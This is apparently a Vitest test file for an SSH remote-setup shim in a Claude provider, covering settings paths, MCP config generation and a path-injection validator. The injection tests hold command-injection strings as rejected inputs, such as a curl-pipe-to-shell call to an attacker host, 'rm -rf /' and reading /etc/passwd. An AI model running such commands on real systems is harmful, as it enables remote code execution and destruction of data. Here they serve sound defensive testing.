import { describe, it, expect, vi } from 'vitest'

// P7.8: getConductorMcpPort returns 0 unless the server has actually bound,
// which never happens in the test sandbox. Mock to a non-zero port so the
// setup-script tests below exercise the `hasVision=true` branch (writes
// canonical SSE schema + cccSessionId URL bake). One test below
// explicitly flips to 0 to cover the empty-mcpServers branch.
let mockedConductorMcpPort = 19333
const MOCK_SECRET = 'b'.repeat(64)
vi.mock('../../../../src/main/conductor-mcp-server', () => ({
  getConductorMcpPort: () => mockedConductorMcpPort,
  getConductorMcpSecret: () => MOCK_SECRET,
}))

import { ClaudeProvider } from '../../../../src/main/providers/claude'
import { generateRemoteSetupScript, assertSafeRemotePath, getRemoteSetupCommand } from '../../../../src/main/providers/claude/ssh-shim'

describe('ClaudeProvider SSH-capable surface', () => {
  it('configureRemoteSettings produces a base64-piped node command', () => {
    const p = new ClaudeProvider()
    const cmd = p.configureRemoteSettings('sid-x', '~/repo', null)
    expect(cmd).toContain('base64 -d | node')
    // `cd --` defends against a path that begins with a dash being parsed as a flag.
    expect(cmd).toContain('cd -- ~/repo')
  })

  it('getSshSettingsPath returns ~/.claude/settings-<safeSid>.json', () => {
    const p = new ClaudeProvider()
    expect(p.getSshSettingsPath('sid-1')).toBe('~/.claude/settings-sid-1.json')
  })

  it('sanitizes session id in settings path', () => {
    const p = new ClaudeProvider()
    expect(p.getSshSettingsPath('sid/with*bad:chars')).toBe('~/.claude/settings-sid_with_bad_chars.json')
  })

  // P7.8 -- per-session --mcp-config path mirrors --settings path layout
  it('getSshMcpConfigPath returns ~/.claude/mcp-<safeSid>.json', () => {
    const p = new ClaudeProvider()
    expect(p.getSshMcpConfigPath('sid-1')).toBe('~/.claude/mcp-sid-1.json')
  })

  it('sanitizes session id in mcp-config path the same way as settings path', () => {
    const p = new ClaudeProvider()
    expect(p.getSshMcpConfigPath('sid/with*bad:chars')).toBe('~/.claude/mcp-sid_with_bad_chars.json')
  })
})

describe('SSH remotePath injection defence', () => {
  it.each([
    '~',
    '~/repo',
    '~user/work',
    '/home/me/project',
    './rel/path',
    '/srv/foo-bar_1.2',
  ])('accepts safe path %s', (p) => {
    expect(() => assertSafeRemotePath(p)).not.toThrow()
  })

  it.each([
    '~; curl attacker/evil.sh | sh #',
    '~ && rm -rf /',
    '`whoami`',
    '$(id)',
    '~/repo;ls',
    '~/repo|cat /etc/passwd',
    '~/repo with space',
    "~/'quote'",
    '~/"dquote"',
    '~/path\nNL',
    '~/repo>out',
  ])('rejects unsafe path %s', (p) => {
    expect(() => assertSafeRemotePath(p)).toThrow(/Refusing to build SSH setup command/)
  })

  it('getRemoteSetupCommand throws on a metacharacter-laden remotePath rather than interpolating it', () => {
    expect(() =>
      getRemoteSetupCommand('sid-x', '~; curl evil.sh | sh #', null),
    ).toThrow(/Refusing to build SSH setup command/)
  })

  it('getRemoteSetupCommand uses `cd --` so a leading-dash path is treated as an operand', () => {
    const cmd = getRemoteSetupCommand('sid-x', '~/repo', null)
    expect(cmd).toContain(' cd -- ~/repo ')
  })
})

describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
  it('writes a per-session mcp-config file with the canonical SSE schema and conductor key', () => {
    const script = generateRemoteSetupScript('sid-x', null)
    // Path: ~/.claude/mcp-<sid>.json
    expect(script).toContain(`path.join(claudeDir,'mcp-sid-x.json')`)
    // The mcpConfig literal is JSON-stringified twice (once for the JSON
    // content, once for embedding as a JS string literal in the script),
    // so quotes appear as \" in the script source. Match the escaped form.
    expect(script).toContain('\\"conductor\\"')
    expect(script).toContain('\\"type\\":\\"sse\\"')
    // Old name absent from the mcp-config WRITE literal -- only present
    // in the strip-legacy cleanup code further down. Pin via the
    // writeFileSync(mcpPath, ...) literal so the assertion can't be
    // satisfied by an unrelated reference to 'conductor' elsewhere in
    // the script.
    const writeMatch = script.match(/fs\.writeFileSync\(mcpPath,"([^"\\]|\\.)*"\)/)
    expect(writeMatch).not.toBeNull()
    expect(writeMatch![0]).toContain('conductor')
    expect(writeMatch![0]).not.toContain('conductor-vision')
  })

  it('bakes ?cccSessionId=<encoded sid> into the remote MCP URL (P7.7.10 parity)', () => {
    const script = generateRemoteSetupScript('sid+with space', null)
    // encodeURIComponent maps "+" -> "%2B" and " " -> "%20"
    expect(script).toContain('?cccSessionId=sid%2Bwith%20space')
  })

  it('bakes the per-launch MCP secret as &token=<secret> into the remote MCP URL (R-DEC-3)', () => {
    const script = generateRemoteSetupScript('sid-x', null)
    expect(script).toContain(`&token=${MOCK_SECRET}`)
  })

  it('strips BOTH legacy conductor-vision AND conductor entries from shared settings + ~/.claude.json', () => {
    const script = generateRemoteSetupScript('sid-x', null)
    // Shared settings.json: both keys defensively removed
    expect(script).toContain(`s.mcpServers['conductor-vision']`)
    expect(script).toContain(`s.mcpServers['conductor']`)
    expect(script).toContain(`delete s.mcpServers['conductor-vision']`)
    expect(script).toContain(`delete s.mcpServers['conductor']`)
    // ~/.claude.json cleanup also defensive on both names
    expect(script).toContain(`c.mcpServers['conductor-vision']`)
    expect(script).toContain(`c.mcpServers['conductor']`)
  })

  it('per-session settings file does NOT carry mcpServers (claude ignores it there)', () => {
    const script = generateRemoteSetupScript('sid-x', null)
    // The clone deletes mcpServers before applying CCC overrides.
    expect(script).toContain(`delete sBase.mcpServers`)
    // sesCfg construction merges sBase + statusLine + (optional hooks); no
    // mcpServers key is added back -- assert no literal mcpServers in the
    // per-session settings write path. Require the anchor match to succeed
    // so a future refactor that renames sBase or reformats spacing fails
    // loudly rather than turning the assertion into a silent no-op.
    const parts = script.split(`Object.assign({},sBase,{`)
    expect(parts.length).toBeGreaterThanOrEqual(2)
    const sesCfgLine = parts[1].split(`})`)[0]
    expect(sesCfgLine.length).toBeGreaterThan(0)
    expect(sesCfgLine).not.toContain('mcpServers')
  })

  // Master status-line switch (onboarding p4): includeStatusLine=false must
  // omit the statusLine stanza from the per-session settings while leaving
  // the rest of the setup (hooks, mcp, legacy cleanup) intact.
  it('includes the statusLine stanza by default', () => {
    const script = generateRemoteSetupScript('sid-x', null)
    expect(script).toContain(`statusLine:{type:'command'`)
  })

  it('includeStatusLine=false omits the statusLine stanza from the per-session settings', () => {
    const script = generateRemoteSetupScript('sid-x', null, { includeStatusLine: false })
    const parts = script.split(`Object.assign({},sBase,{`)
    expect(parts.length).toBeGreaterThanOrEqual(2)
    const sesCfgLine = parts[1].split(`})`)[0]
    expect(sesCfgLine).not.toContain('statusLine')
    // The shim file is still staged (inert without the stanza) and the
    // legacy-global cleanup still runs.
    expect(script).toContain('conductor-ssh-statusline.js')
  })

  // Master-off + legacy remote: the per-session clone must strip a legacy
  // shared statusLine stanza BEFORE the clone is written, or the first
  // post-upgrade connect inherits it despite the master being off (the
  // shared-file heal runs after the clone is taken).
  it('strips a legacy statusLine stanza from the sBase clone itself', () => {
    const script = generateRemoteSetupScript('sid-x', null, { includeStatusLine: false })
    expect(script).toContain('delete sBase.statusLine')
    // Ordering: the sBase strip appears before the per-session settings write.
    expect(script.indexOf('delete sBase.statusLine')).toBeLessThan(script.indexOf('sesPath'))
  })

  it('configureRemoteSettings threads the master-switch opts through to the script', () => {
    const p = new ClaudeProvider()
    const on = p.configureRemoteSettings('sid-x', '~/repo', null)
    const off = p.configureRemoteSettings('sid-x', '~/repo', null, { includeStatusLine: false })
    expect(on).not.toBe(off)
  })

  // Built-in tools master (onboarding p6): off = empty remote mcpServers,
  // exactly like the port-0 fallback; statusline is independent of this flag.
  it('includeConductorMcp=false writes empty remote mcpServers (no built-in tools)', () => {
    const script = generateRemoteSetupScript('sid-x', null, { includeConductorMcp: false })
    const writeMatch = script.match(/fs\.writeFileSync\(mcpPath,"([^"\\]|\\.)*"\)/)
    expect(writeMatch).not.toBeNull()
    expect(writeMatch![0]).toContain('\\"mcpServers\\":{}')
    expect(writeMatch![0]).not.toContain('conductor')
    expect(script).toContain(`statusLine:{type:'command'`)
  })

  // P7.8 parity with writeLocalSessionMcpConfig: when the conductor server
  // hasn't bound yet (port=0), write an empty mcpServers object rather than
  // pointing at a phantom port. Mirrors the local writer's behaviour and
  // avoids silently dispatching SSH sessions to whatever process owns 19333.
  it('writes empty mcpServers when the conductor server has not bound (port=0)', () => {
    mockedConductorMcpPort = 0
    try {
      const script = generateRemoteSetupScript('sid-x', null)
      const writeMatch = script.match(/fs\.writeFileSync\(mcpPath,"([^"\\]|\\.)*"\)/)
      expect(writeMatch).not.toBeNull()
      // Empty mcpServers literal: {"mcpServers":{}} -> doubly-stringified
      // becomes the substring \"mcpServers\":{} inside the script source.
      expect(writeMatch![0]).toContain('\\"mcpServers\\":{}')
      expect(writeMatch![0]).not.toContain('conductor')
      expect(writeMatch![0]).not.toContain('cccSessionId')
    } finally {
      mockedConductorMcpPort = 19333
    }
  })
})
